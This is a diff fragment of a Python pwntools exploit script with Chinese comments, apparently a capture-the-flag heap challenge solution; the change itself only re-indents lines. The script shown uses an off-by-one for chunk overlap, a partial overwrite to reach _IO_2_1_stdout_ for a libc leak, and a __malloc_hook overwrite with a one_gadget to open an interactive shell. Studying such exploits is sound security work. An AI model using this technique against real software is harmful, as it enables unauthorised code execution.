@@ -113,11 +113,11 @@ while True:
 		add(0x68)
 		add(0x18)
 		edit(0,'a'*0x18+'\x71')
-    delete(1)
-    #off-by-one，构造堆块重叠
+		delete(1)
+		#off-by-one，构造堆块重叠
     
 		delete(2)
-    #将目标chunk放入fastbin
+		#将目标chunk放入fastbin
     
 		add(0xf8)#1，让fastbin中chunk的fd中保存main_arena+88
     
@@ -125,20 +125,20 @@ while True:
     
 		
 		edit(2,'\xdd\x25')
-    #修改低位两字节
+		#修改低位两字节
 		
 		add(0x68)#4
     
 		add(0x68)#5，该chunk在`_IO_2_1_stdout_`结构体附近
 		
 		edit(5,'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
-    #填充payload
+		#填充payload
     
 		IO_stderr = u64(ru("\x7f")[-6:].ljust(8,'\x00'))-192
 		libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
 		print 'libc:' + hex(libc_base)
 		malloc_hook = libc_base + libc.symbols['__malloc_hook']
-    print 'malloc:' + hex(malloc_hook-0x10)
+		print 'malloc:' + hex(malloc_hook-0x10)
 		#接收地址
     
 		add(0x18)#6
@@ -162,7 +162,7 @@ while True:
 		#填充payload，覆盖malloc_hook为one_gadget
     
 		cho(1)
-    sla("size?",str(100))
+		sla("size?",str(100))
 		#调用malloc		
     
 		ia()
